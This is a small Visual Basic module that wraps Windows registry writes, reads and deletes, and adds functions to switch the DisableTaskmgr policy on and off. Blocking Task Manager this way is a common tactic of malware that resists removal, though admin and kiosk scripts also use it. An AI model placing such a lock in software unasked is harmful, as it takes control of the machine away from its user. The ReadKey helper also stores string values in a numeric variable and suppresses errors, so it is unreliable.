Attribute VB_Name = "DisableCTRL"
Option Explicit
Dim r As Long


Public Sub CreateKey(Folder As String, Value As String)
    Dim b As Object
    On Error Resume Next
    Set b = CreateObject("wscript.shell")
    b.RegWrite Folder, Value
End Sub

Public Sub CreateIntegerKey(Folder As String, Value As Integer)
    Dim b As Object
    On Error Resume Next
    Set b = CreateObject("wscript.shell")
    b.RegWrite Folder, Value, "REG_DWORD"
End Sub

Public Property Get ReadKey(Value As String) As String

Dim b As Object
    On Error Resume Next
    Set b = CreateObject("wscript.shell")
    r = b.RegRead(Value)
    ReadKey = r
End Property

Public Sub DeleteKey(Value As String)
    Dim b As Object
    On Error Resume Next
    Set b = CreateObject("Wscript.Shell")
    b.RegDelete Value
End Sub

Public Function Disabletaskmanager()
    CreateIntegerKey "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskmgr", "1"
End Function

Public Function enabletaskmanager()
    CreateIntegerKey "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskmgr", "0"
End Function


